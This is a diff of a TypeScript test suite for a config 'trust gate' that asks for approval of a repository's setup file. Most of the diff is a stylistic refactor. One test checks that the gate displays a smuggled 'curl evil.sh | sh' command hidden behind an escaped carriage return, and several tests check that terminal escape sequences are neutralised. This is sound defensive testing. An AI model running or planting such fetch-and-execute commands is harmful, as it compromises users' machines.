@@ -6,14 +6,17 @@ import { spawnSync } from "node:child_process";
 import { createHash } from "node:crypto";
 import { join } from "node:path";
 import { tmpdir } from "node:os";
-import { makeFixtureOrigin, type FixtureOrigin } from "../fixtures.ts";
+import { makeFixtureOrigin } from '../fixtures.ts';
+import type { FixtureOrigin } from '../fixtures.ts';
 import { loadProject } from "../../src/config/load.ts";
 import type { Ctx, ProjectConfig } from "../../src/config/schema.ts";
 import { initPrimaryRepo, fetchBranch } from "../../src/git/repo.ts";
 import { unavailableGh } from "../../src/git/gh.ts";
 import { Logger } from "../../src/lib/log.ts";
-import { STATE_VERSION, type State } from "../../src/core/state.ts";
-import { settleProject, trustGate, type TrustIO } from "../../src/core/trust.ts";
+import { STATE_VERSION } from '../../src/core/state.ts';
+import type { State } from '../../src/core/state.ts';
+import { settleProject, trustGate } from '../../src/core/trust.ts';
+import type { TrustIO } from '../../src/core/trust.ts';
 
 const V1 = [
   `[setup]`,
@@ -37,10 +40,10 @@ let state: State;
 
 const sha256 = (s: string) => createHash("sha256").update(Buffer.from(s, "utf8")).digest("hex");
 
-function fakeIO(opts: { tty: boolean; answer?: string | null }): TrustIO & { out: string; asked: string[] } {
+function fakeIO(opts: { tty: boolean; answer?: string | null }): TrustIO & { out: string; asked: Array<string> } {
   const io = {
     out: "",
-    asked: [] as string[],
+    asked: [] as Array<string>,
     isTTY: () => opts.tty,
     prompt: (message: string) => {
       io.asked.push(message);
@@ -272,7 +275,7 @@ describe("trust gate", () => {
 
   it("a .testlane.toml that is not a regular file is refused", async () => {
     const work = join(tmp, "work");
-    const git = (...args: string[]) => {
+    const git = (...args: Array<string>) => {
       const res = spawnSync("git", ["-C", work, "-c", "user.name=t", "-c", "user.email=t@t", ...args]);
       expect(res.status, res.stderr.toString()).toBe(0);
     };
@@ -289,6 +292,8 @@ describe("trust gate", () => {
   });
 
   it("a mangled stored approval counts as none", async () => {
+    // The test forges a stored approval of the wrong shape on purpose.
+    // oxlint-disable-next-line quality/no-chained-type-assertions
     state.repoConfig = { sha256: 1 } as unknown as State["repoConfig"];
     const io = fakeIO({ tty: true, answer: "y" });
     const r = await trustGate(ctx, project, state, { io });
@@ -311,7 +316,7 @@ describe("what the gate shows", () => {
     const io = fakeIO({ tty: true, answer: "n" });
     await trustGate(ctx, project, state, { io });
     expect(io.out).toMatch(/setup\.run\s+curl evil\.sh \| sh\\r npm ci/);
-    expect(io.out).toContain("pnpm dev\\u001b[1A\\u001b[2K");
+    expect(io.out).toContain(String.raw`pnpm dev\u001b[1A\u001b[2K`);
     expect(io.out).not.toMatch(/[\u0000-\u0008\u000b-\u001f\u007f-\u009f]/);
   });
 
@@ -329,7 +334,7 @@ describe("what the gate shows", () => {
     await pushAndFetch({ ".testlane.toml": V1 + `# \u009b2K\n` });
     const io = fakeIO({ tty: true, answer: "n" });
     await trustGate(ctx, project, state, { io });
-    expect(io.out).toContain("+# \\u009b2K");
+    expect(io.out).toContain(String.raw`+# \u009b2K`);
     expect(io.out).not.toContain("\u009b");
   });
 });
@@ -338,7 +343,7 @@ describe("an unusable stored approval", () => {
   it("one that no longer matches its sha256 counts as none: the gate asks again and --yes repairs it", async () => {
     await trustGate(ctx, project, state, { io: fakeIO({ tty: true, answer: "y" }) });
     state.repoConfig!.content += "# tampered\n";
-    const warnings: string[] = [];
+    const warnings: Array<string> = [];
     ctx.log.warn = (m: string) => {
       warnings.push(m);
     };
